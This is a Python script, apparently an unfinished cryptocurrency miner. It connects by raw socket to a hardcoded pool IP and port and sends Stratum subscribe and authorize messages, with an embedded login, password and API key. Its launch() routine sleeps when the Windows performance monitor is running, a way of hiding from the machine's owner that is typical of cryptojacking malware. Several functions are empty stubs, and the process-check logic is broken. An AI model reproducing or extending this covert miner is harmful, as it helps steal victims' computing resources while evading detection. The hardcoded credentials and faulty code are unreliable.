from  platform  import  system  as  os_type
from  os        import  system
from  time      import  sleep
from  random    import  randint

import  socket  as  sock

import json
import requests

API = 'lxk.d4f5a03b96616b33efbc958f058bb46c'

def math(bob):

    pass


class miner():

    def __init__(self):
        self.__pool = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        #self.__auth = sock.socket(sock.AF_INET, sock.SOCK_STREAM)

        while True:
            try:
                self.__pool.connect(('34.120.158.124', 700))
            except:
                sleep(10)
            else:
                break


    def ask(self):

        try:
            PKGP = json.dumps({
                "id"     : 1,
                "method" : 'mining.subscribe',
                "params" : []
            }).encode('utf-8')

            self.__pool.sendall(PKGP + b'\n')
            data = self.__pool.recv(2048).decode('utf-8')

            print(data,'\n')

            PKGP = json.dumps({
                "id"     : 2,
                "method" : 'mining.authorize',
                "params" : ['eagle2snitch@duck.com','G41q0_desK']
            }).encode('utf-8')

            dati = self.__pool.sendall(PKGP + b'\n')
            data = self.__pool.recv(1024).decode('utf-8')

            print(dati)


            hardness = data.split('\n')[1]
            payload = data.split('\n')[2]

                     
        except Exception as e:
            print(f'exception: {e}')
            #sleep(10)

        else:

            if data:

                hardness = json.loads(hardness)
                self.__hardness = hardness.get('params')[0]

                payload = json.loads(payload)             

                self.__job_id = int(payload.get('params')[0])

                self.__p_hash = payload.get('params')[1]

                self.__coinbase1 = payload.get('params')[2]

                self.__coinbase2 = payload.get('params')[3]

                self.__merkle = payload.get('params')[4]

                self.__version = payload.get('params')[5]

                self.__nbits = payload.get('params')[6]

                self.__ntime = payload.get('params')[7]

                self.__force = payload.get('params')[8]

                slave.work()


    def work(self):
        
        self.__luce = None
        pass
        

    def launch(self):
        
        if os_type() == 'Windows':

            if 'perfmon.exe' in system('tasklist'):
                sleep(60)

            
        elif os_type() == 'Linux':

            if '' in ['bob']:
                pass
            

if __name__=='__main__':
    slave = miner()

    for i in range(2):
        #while true:
        slave.ask()